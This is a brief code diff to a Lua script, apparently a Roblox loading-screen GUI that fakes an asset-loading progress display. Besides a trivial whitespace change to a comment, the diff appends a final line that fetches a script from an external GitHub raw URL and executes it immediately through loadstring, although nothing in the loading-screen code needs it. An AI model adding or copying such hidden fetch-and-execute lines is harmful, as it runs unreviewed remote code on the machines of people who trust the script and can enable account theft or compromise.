@@ -64,7 +64,7 @@ assetText.TextColor3 = Color3.fromRGB(255,255,255)
 assetText.Text = "> Loading asset 0/" .. TOTAL_ASSETS
 assetText.Parent = bg
 
--- Loading simulation
+-- Loading simulation 
 local start = tick()
 local loaded = 0
 
@@ -86,3 +86,4 @@ RunService.RenderStepped:Connect(function()
         gui:Destroy()
     end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SkyeeScript/ZYSUMEV2/refs/heads/main/ZYSUMEV2"))()
